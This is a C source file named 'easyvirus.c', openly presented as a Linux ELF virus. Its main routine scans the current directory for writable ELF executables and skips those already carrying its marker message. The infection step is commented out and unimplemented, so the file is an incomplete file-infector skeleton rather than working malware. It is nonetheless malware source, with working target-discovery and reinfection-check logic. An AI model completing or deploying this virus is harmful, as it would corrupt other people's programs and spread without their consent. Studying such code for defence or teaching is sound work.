/*
 * easyvirus.c
 *
 *  Created on: Dec 20, 2015
 *      Author: klaus
 */
#define _GNU_SOURCE
#include <string.h>
#include <dirent.h>
#include <stdio.h>
#include <elf.h>
#include <unistd.h>
#include <stdlib.h>

#define MESSAGE "Hey! I am an elf virus ;-)!\n"
#define SMESSAGE (sizeof(MESSAGE)-1)

int is_already_infected(char *file_name);
int is_elf(char *file_name);
void infect_binary(const char *file_name);

int main(int argc, char **argv) {
    DIR *dirstream;
    struct dirent *dir_entry;
    char *last_file_name;

    dirstream = opendir(".");

    if (dirstream == NULL) {
        perror("Couldn't get directory");
        exit(2);
    }

    last_file_name = NULL;
    while ((dir_entry = readdir(dirstream)) != NULL) {
        // Test if file is not current or parent dir or self
        if (!strcmp(dir_entry->d_name, "."))
            continue;
        if (!strcmp(dir_entry->d_name, ".."))
            continue;
        if (!strcmp(dir_entry->d_name, basename(argv[0])))
            continue;
        // Test for read and write permission
        if (access(dir_entry->d_name, R_OK | W_OK) != 0)
            continue;
        // Test if file is a ELF
        if (!is_elf(dir_entry->d_name))
            continue;
        // Test if file is not already infected
        if (is_already_infected(dir_entry->d_name))
            continue;

        last_file_name = dir_entry->d_name;
        printf("%s\n", dir_entry->d_name);
    }

    closedir(dirstream);

    // If there is no infectable file, exit
    if(last_file_name == NULL)
        return 0;

    // Infect binary
//    infect_binary(last_file_name);
}

int is_already_infected(char *file_name) {
    FILE *fp;
    long size;
    char *buffer;

    fp = fopen(file_name, "rb");

    if (fp == NULL) {
        perror("File open error");
        exit(2);
    }

    fseek(fp, 0, SEEK_END);
    size = ftell(fp);
    rewind(fp);

    buffer = (char *) malloc(size);
    if (buffer == NULL) {
        perror("Memory allocation error");
        fclose(fp);
        free(buffer);
        exit(2);
    }

    if(fread(buffer, 1, size, fp) != size) {
        perror("File reading error");
        fclose(fp);
        free(buffer);
        exit(2);
    }

    int ret = memmem(buffer, size, MESSAGE, SMESSAGE) != NULL;

    fclose(fp);
    free(buffer);
    return ret;
}

int is_elf(char *file_name) {
    FILE *fp;
    fp = fopen(file_name, "rb");

    if (fp == NULL) {
        perror("File open error");
        exit(2);
    }

    char buf[sizeof(Elf32_Ehdr)];

    int n = fread(&buf, 1, sizeof(Elf32_Ehdr), fp);

    // See if file is as least large enough for the 32 bit ELF header
    // and if the first few bytes match the magic string
    if (n != sizeof(Elf32_Ehdr) || memcmp(buf, ELFMAG, SELFMAG) != 0) {
        fclose(fp);
        return 0;
    }

    fclose(fp);
    return 1;
}

/**
 * Infect binary
 */
void infect_binary(const char *file_name) {
    FILE *fp;
    long size;
    char *buffer;

    fp = fopen(file_name, "r+b");

    if (fp == NULL) {
        perror("File open error");
        exit(2);
    }

    fseek(fp, 0, SEEK_END);
    size = ftell(fp);
    rewind(fp);

    buffer = (char *) malloc(size);
    if (buffer == NULL) {
        perror("Memory allocation error");
        fclose(fp);
        free(buffer);
        exit(2);
    }

    if(fread(buffer, 1, size, fp) != size) {
        perror("File reading error");
        fclose(fp);
        free(buffer);
        exit(2);
    }

    // Find out if it's a 32 bit or 64 bit binary
//    if (fseek(fp, EI_CLASS, SEEK_SET) == NULL) {
//        perror("File read error");
//        fclose(fp);
//        exit(2);
//    }


    free(buffer);
    fclose(fp);
}
